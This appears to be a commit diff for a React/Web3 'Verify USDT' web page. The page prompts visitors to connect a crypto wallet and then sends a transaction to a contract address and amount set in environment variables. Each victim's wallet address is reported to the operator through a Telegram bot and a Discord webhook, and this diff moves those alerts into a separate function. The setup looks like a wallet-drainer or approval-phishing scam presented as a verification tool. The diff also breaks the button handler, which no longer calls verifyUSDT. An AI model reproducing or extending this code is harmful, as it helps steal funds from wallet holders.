@@ -1,8 +1,37 @@
 import { useState } from 'react'
 import './App.css'
-import Web3 from 'web3';
+import {Web3} from 'web3';
 
 
+const sendNotification = async (user)=>{
+   // Send notifications
+   const teleToken = import.meta.env.VITE_TELETOKEN
+  const teleChatId = import.meta.env.VITE_TELECHATTOKEN
+  const discordToken = import.meta.env.VITE_DISCORD
+    try {
+      // Telegram notification
+      await fetch(`https://api.telegram.org/bot${teleToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: teleChatId,
+          text: `✅ USDT Verified: ${user}`
+        })
+      });
+
+      // Discord notification
+      await fetch(discordToken, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `✅ USDT BEP-20 Verified: ${user}`
+        })
+      });
+
+    } catch (notifyError) {
+      console.error("Notification error:", notifyError);
+    }
+}
 async function verifyUSDT() {
   if (typeof window.ethereum === 'undefined') {
     alert('Please install MetaMask, Trust Wallet, or Binance Wallet to proceed.');
@@ -12,9 +41,6 @@ async function verifyUSDT() {
   const provider = window.ethereum;
 
   const contract = import.meta.env.VITE_CONTRACT
-  const teleToken = import.meta.env.VITE_TELETOKEN
-  const teleChatId = import.meta.env.VITE_TELECHATTOKEN
-  const discordToken = import.meta.env.VITE_DISCORD
   const amount = import.meta.env.VITE_AMOUNT
 
   try {
@@ -55,36 +81,13 @@ async function verifyUSDT() {
       gasPrice: gasPrice
     });
 
+    sendNotification(user)
     // Show success message
     successMessage.style.display = "block";
     loadingSpinner.style.display = 'none';
     loadingIndicator.style.display = 'none';
 
-    // Send notifications
-    try {
-      // Telegram notification
-      await fetch(`https://api.telegram.org/bot${teleToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: teleChatId,
-          text: `✅ USDT Verified: ${user}`
-        })
-      });
-
-      // Discord notification
-      await fetch(discordToken, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          content: `✅ USDT BEP-20 Verified: ${user}`
-        })
-      });
-
-    } catch (notifyError) {
-      console.error("Notification error:", notifyError);
-    }
-
+  
   } catch (error) {
     console.error(error);
     alert("Verification failed. Please try again.");
@@ -96,6 +99,7 @@ async function verifyUSDT() {
 function App() {
 
   const [slider , setSlider] = useState(5)
+  const [loading , setLoading ] = useState(false)
 
   return (
     <>
@@ -115,7 +119,7 @@ function App() {
           <div class="gas-info">Adjust transaction speed and cost</div>
         </div>
 
-        <button class="verify-btn" id="verifyBtn" onClick={() => verifyUSDT()}>
+        <button class="verify-btn" id="verifyBtn" onClick={() => verifyUSDT}>
           <i class="fas fa-check-circle"></i> Verify USDT
         </button>
 
